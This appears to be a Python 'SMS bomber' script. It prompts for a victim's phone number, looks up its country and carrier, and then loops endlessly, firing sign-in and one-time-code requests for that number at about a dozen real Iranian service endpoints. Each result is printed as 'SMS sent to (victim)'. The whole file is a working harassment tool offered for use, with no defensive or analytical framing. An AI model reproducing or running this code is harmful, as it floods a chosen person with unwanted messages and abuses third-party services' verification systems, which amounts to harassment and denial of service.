from phonenumbers import geocoder
from phonenumbers import carrier
import phonenumbers
import time
from requests import post , get
import os
from colorama import Fore


def bomber():
    print(Fore.RED + "   [" + Fore.LIGHTWHITE_EX + "-" + Fore.RED + "]" + Fore.LIGHTCYAN_EX + " Welcome, Please Enter The Phone Nimber in The ciuntry Code " + Fore.RED + "[" + Fore.LIGHTWHITE_EX + "-" + Fore.RED + "]   " )
    print(Fore.LIGHTCYAN_EX + "   __________________________________________________________________   \n")
    number = input(Fore.RED + "   [-]" + Fore.LIGHTCYAN_EX + " Enter The Number(+98) " + Fore.RED + "$ " + Fore.LIGHTWHITE_EX + "")
    numbers = input(Fore.RED + "\n   [-]" + Fore.LIGHTCYAN_EX + " Number of Submissions " + Fore.RED + "$ " + Fore.LIGHTWHITE_EX + "")
    print(Fore.LIGHTCYAN_EX + "   __________________________________________________________________   \n")
    time.sleep(1.1)
    phonenumb = phonenumbers.parse(number)
    print(Fore.RED + "   [-]" + Fore.LIGHTCYAN_EX + " Country of the desired number : " + Fore.WHITE + geocoder.description_for_number(phonenumb, "en"))
    print(Fore.RED + "   [-]" + Fore.LIGHTCYAN_EX + " The operator of the desired number : " + Fore.WHITE + carrier.name_for_number(phonenumb, "en"))
    time.sleep(0.2)
    input(Fore.RED + "   [-]" + Fore.LIGHTCYAN_EX + " Enter to continue ... ")
    print(Fore.RED + "   [" + Fore.LIGHTWHITE_EX + "-" + Fore.RED + "]" + Fore.LIGHTCYAN_EX + "Please wait until The end of The operation to cancel(Ctrl-C)" + Fore.RED + "[" + Fore.LIGHTWHITE_EX + "-" + Fore.RED + "]   " )
    time.sleep(5)
    os.system('clear' or 'cls')
    print(Fore.LIGHTCYAN_EX + "   __________________________________________________________________   \n")


##########################################

    snapj = {"phone":number}
    tapsi1 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
    divarj = {"phone":number}
    emd = "send=1&cellphone="+number
    rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":number,"send_type":"SMS"}}
    bamad = "cellNumber="+number
    ali = {"phoneNumber": number }
    arkd = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}



    while True:
        r3 = post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
        if r3.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r4 = post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
        if r4.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r5 = post("https://messengerg2c42.iranlms.ir/",json=rubj)
        if r5.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r6 = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
        if r6.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r7 = post("https://web.emtiyaz.app/json/login",data=emd)
        if r7.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r8 = post("https://bama.ir/signin-checkforcellnumber",data=bamad)
        if r8.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r9 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
        if r9.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED + '   [+] SMS not sent to (victim)' , number)
        r11 = post("https://api.chartex.net/api/v2/user/validate",json=arkd)
        if r11.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r12 = get("https://api.torob.com/a/phone/send-pin/?phone_number="+number)
        if r12.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r13 = get("https://api.binjo.ir/api/panel/get_code/"+number)
        if r13.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r14 = get("https://core.gap.im/v1/user/add.json?mobile="+number)
        if r14.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
        r15 = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}')
        if r15.status_code == 200:
            print(Fore.LIGHTCYAN_EX +'   [+] SMS sent to (victim) ' , number)
        else:
            print(Fore.RED +'   [+] SMS not sent to (victim)' , number)
